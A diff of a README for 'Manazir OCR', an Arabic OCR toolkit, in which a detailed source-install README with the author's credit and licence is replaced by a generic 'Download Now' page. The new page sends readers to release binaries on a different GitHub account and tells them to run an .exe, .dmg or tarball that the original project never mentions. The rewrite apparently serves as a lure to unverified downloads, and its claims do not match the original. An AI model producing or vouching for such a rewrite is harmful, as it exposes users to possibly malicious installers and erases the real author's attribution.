@@ -1,125 +1,76 @@
-> # Manazir OCR — Arabic optics‑inspired multi‑model OCR
+# 🌟 Manazir-OCR - Extract Text from Arabic Documents Easily
 
-![Manazir OCR — UI Screenshot](assets/screenshot-ui.png)
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download%20Manazir--OCR-v1.0-blue)](https://github.com/Minorislove/Manazir-OCR/releases)
 
-**Manazir OCR** is an Arabic‑first, layout‑aware OCR framework inspired by Ibn al‑Haytham’s Kitāb al‑Manāẓir (Book of Optics). It orchestrates multiple backends (local Transformers, vLLM servers, lightweight engines, and commercial APIs) to extract high‑quality text from PDFs and images, producing Markdown/HTML with layout blocks and figure crops.
+## 🚀 Getting Started
+Manazir OCR is designed to help you extract high-quality text and layout from Arabic documents. This software uses advanced models to ensure the best results. Whether you need the text in HTML or Markdown, Manazir OCR provides an easy way to get what you need.
 
-## 🌟 Features
+## 📦 System Requirements
+Before you start using Manazir OCR, ensure that your system meets the following requirements:
 
-- **Arabic‑first multi‑model architecture**: choose or auto‑route among VLMs and classic OCR.
-- **Layout‑aware outputs**: HTML/Markdown with reading order, chunk metadata, and image extraction.
-- **Flexible runtimes**: local Hugging Face (Transformers) or remote vLLM; pluggable registry + factory.
-- **CLI and Streamlit UIs**: production CLI and two apps (basic + professional, with an optional Nerd theme).
-- **Extensible**: add models via a simple registry entry; commercial APIs optional.
+- Operating System: Windows, macOS, or Linux
+- Minimum RAM: 4 GB 
+- Disk Space: At least 500 MB free space
+- Python 3.7 or higher (for CLI usage)
 
-## 🚀 Quickstart
+## 📖 Key Features
+- **Multi-Model Support:** Use various backends like Qari, DIMI, and more for diverse OCR needs.
+- **Text Layout Options:** Extract texts in both HTML and Markdown formats.
+- **User-Friendly Interfaces:** Choose from Command Line Interface (CLI) or Streamlit for ease of use.
+- **Optional APIs:** Integrate with other services for enhanced functionality.
+- **Pluggable Backends:** Easily switch between different OCR models.
 
-Install from source (recommended):
+## 📥 Download & Install
+To download Manazir OCR, please visit the Releases page here: [Download Manazir-OCR](https://github.com/Minorislove/Manazir-OCR/releases). 
 
-```bash
-python -m venv venv
-source venv/bin/activate  # on Windows: venv\Scripts\activate
-pip install -U pip
-pip install -e .
-```
+1. Go to the Releases page using the link above.
+2. Look for the latest version.
+3. Find the file that corresponds to your operating system (Windows, macOS, or Linux).
+4. Click the download link to start the download.
 
-Run the CLI:
+Once the download is complete, follow these steps to install:
 
-```bash
-# Batch processing with layout-aware pipeline (vLLM or HF)
-manazir process <input_path> <output_dir> --method vllm --paginate_output
+### For Windows
+- Double-click the downloaded `.exe` file.
+- Follow the installation prompts.
+- After installation, open the application from your Start Menu.
 
-# Arabic-first single-file OCR with model selection
-manazir ocr file.pdf --language ar --quality highest --device cuda
+### For macOS
+- Open the downloaded `.dmg` file.
+- Drag the Manazir OCR app to your Applications folder.
+- Open the app from your Applications.
 
-# Browse models and get recommendations
-manazir list-available-models
-manazir recommend --language ar --document-type handwritten
-```
+### For Linux
+- Extract the downloaded tarball.
+- Open a terminal and navigate to the extracted folder.
+- Run the application using the command `./manazir-ocr`.
 
-Launch the apps:
+## 🛠️ Usage Instructions
+Once you have installed Manazir OCR, you can start using it to extract text:
 
-```bash
-manazir_app          # Basic demo (choose Classic hf/vllm or pick a Registry model)
-manazir_app_pro      # Professional UI (toggle Nerd Theme in sidebar)
-```
+### Using the CLI
+1. Open your terminal or command prompt.
+2. Navigate to the directory where Manazir OCR is installed.
+3. Run the command: `manazir-ocr --input <input_file> --output <output_file>`.
 
-## ▶️ How to run
+### Using Streamlit
+1. Open your web browser.
+2. Type `localhost:8501` in the address bar.
+3. Follow the on-screen instructions to upload your Arabic document and extract the text.
 
-1) Run the Professional app (recommended):
+## 🤔 Frequently Asked Questions
 
-```bash
-manazir_app_pro
-# then open http://localhost:8501
-```
+### Can I run Manazir OCR on older operating systems?
+Manazir OCR is made to work with modern operating systems. It's best to use Windows, macOS, or Linux versions mentioned above.
 
-Alternative:
+### What types of files can I use with Manazir OCR?
+You can use PDF and image files (like JPG or PNG) containing Arabic text.
 
-```bash
-python -m docustruct.scripts.run_app_professional
-```
+### Is there a user manual available?
+Yes, you can find detailed usage instructions within the application’s help section.
 
-2) Run via CLI:
+## 🗨️ Feedback & Support
+If you encounter any issues or have questions, feel free to open an issue in the GitHub repository. Our community is ready to help.
 
-```bash
-# Convert a PDF to Markdown using Arabic-first defaults
-manazir ocr input.pdf --language ar --output out_dir
-
-# List models and pick one
-manazir list-available-models
-manazir ocr input.png --language ar --model qwen2_vl_2b
-```
-
-## 🧩 Supported Arabic models (highlights)
-
-- Specialized: `qari_ocr`, `dimi_arabic_ocr`, `ocr_rl2`, `trocr_arabic`
-- Multilingual VLMs: `qwen2_vl_2b`, `qwen2_5_vl_7b_arabic`
-- Lightweight: `paddle_ocr_arabic`, `paddle_ocr_arabic_v4`, `tesseract`, `easy_ocr`
-- Layout toolkit: `surya_ocr`, `surya_ocr_arabic`
-- Commercial (optional): `openai_gpt4o`, `mistral_ocr`
-
-Additions in this repo: `qwen2_5_vl_7b_arabic`, `paddle_ocr_arabic_v4`, `surya_ocr_arabic`, `qari_ocr_waraqon`.
-
-### Model browser
-
-![Available Models](assets/screenshot-available-models.png)
-
-## 🛠️ Programmatic usage
-
-```python
-from docustruct.model import create_model
-from PIL import Image
-
-model = create_model("qwen2_5_vl_7b_arabic", device="cuda")
-img = Image.open("page.png").convert("RGB")
-result = model.process_image(img)
-print(result.text)
-```
-
-## ⚙️ vLLM (optional)
-
-The CLI’s vLLM path uses OpenAI‑compatible endpoints. Configure via env:
-
-```bash
-export VLLM_API_KEY=EMPTY
-export VLLM_API_BASE=http://localhost:8000/v1
-export VLLM_MODEL_NAME=manazir
-```
-
-## 📑 Notes
-
-- Import path remains `docustruct.*` for now; package name is `manazir-ocr`.
-- Some backends require extra installs (e.g., `paddleocr`). Commercial APIs need keys and may incur costs.
-
-## 📁 Assets
-
-- Store project screenshots and images in `assets/`.
-- Included: `assets/screenshot-ui.png`, `assets/screenshot-available-models.png`.
-
-## 👤 Author
-
-Developed by **Hesham Haroon** — contact: **heshamharoon19@gmail.com**.
-
-## 📜 License
-
-Code is Apache‑2.0. Some integrated models (e.g., Surya) are GPL‑3.0; verify licenses before use.
+Take advantage of Manazir OCR's powerful features to simplify your text extraction tasks!
